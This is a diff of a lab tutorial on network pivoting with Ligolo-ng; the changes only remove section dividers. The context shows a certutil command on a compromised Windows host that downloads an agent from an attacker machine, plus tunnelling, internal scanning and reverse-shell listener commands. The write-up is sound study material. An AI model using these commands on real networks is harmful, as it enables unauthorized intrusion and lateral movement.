@@ -11,7 +11,6 @@ When you compromise a machine that sits between two networks — your attacker m
 
 Chisel and proxychains work, but they're slow and clunky for scanning. Ligolo-ng is different. It creates an actual TUN interface on your Kali machine — a virtual network card — and routes traffic through it at the OS level. That means you can run `nmap` directly against internal hosts without proxychains. No speed penalty, no wrapper commands.
 
----
 
 ## Lab Setup
 
@@ -22,7 +21,6 @@ Two networks in this lab:
 
 Foothold machine sits on both. It's a Windows box I already had a shell on.
 
----
 
 ## Step 1 — Get the Binaries
 
@@ -43,7 +41,6 @@ Unzip the agent:
 unzip ligolo-ng_agent_windows_amd64.zip
 ```
 
----
 
 ## Step 2 — Transfer the Agent to the Foothold
 
@@ -59,7 +56,6 @@ Download it on the Windows shell you already have:
 certutil -urlcache -split -f "http://192.168.100.10/agent.exe" agent.exe
 ```
 
----
 
 ## Step 3 — Create the TUN Interface on Kali
 
@@ -73,7 +69,6 @@ ifconfig
 
 You should see `ligolo` listed as an interface. It has no IP — that's fine. It's a routing interface, not a host interface.
 
----
 
 ## Step 4 — Start the Proxy on Kali
 
@@ -87,7 +82,6 @@ Ligolo generates a self-signed cert and listens on port `11601` by default. Outp
 INFO[0000] Listening on 0.0.0.0:11601
 ```
 
----
 
 ## Step 5 — Connect the Agent from the Foothold
 
@@ -103,7 +97,6 @@ Back on Kali, your proxy console shows a new session:
 INFO[0012] Agent connected: user@FOOTHOLD-PC
 ```
 
----
 
 ## Step 6 — Start the Session
 
@@ -115,7 +108,6 @@ session
 
 Select `1` (your connected agent). You're now controlling the tunnel from the foothold's perspective.
 
----
 
 ## Step 7 — Enumerate the Internal Network
 
@@ -129,7 +121,6 @@ Ethernet adapter Internal:
 
 Two adapters — one on `192.168.100.0/24` (which you knew about) and one on `10.10.1.0/24` (the internal network you couldn't reach). That's your target subnet.
 
----
 
 ## Step 8 — Add the Route on Kali
 
@@ -147,7 +138,6 @@ route
 
 You should see `10.10.1.0` pointing to `ligolo`.
 
----
 
 ## Step 9 — Start the Tunnel
 
@@ -167,7 +157,6 @@ nmap -sT -Pn -n --top-ports 100 10.10.1.200
 
 Direct scan. Full speed. No proxychains overhead.
 
----
 
 ## Catching Reverse Shells From Internal Hosts
 
@@ -204,13 +193,11 @@ listener_list          # see active listeners
 listener_stop --id 0   # stop a specific listener
 ```
 
----
 
 ## What's Actually Happening
 
 The reason this works cleanly is the TUN interface. From your OS's perspective, `10.10.1.0/24` is a directly connected network — it just happens to physically exist on the other side of an encrypted tunnel through your foothold. Every tool on Kali treats it like a local network. That's the power of working at the network layer instead of the proxy layer.
 
----
 
 ## When to Use Ligolo vs Chisel
 
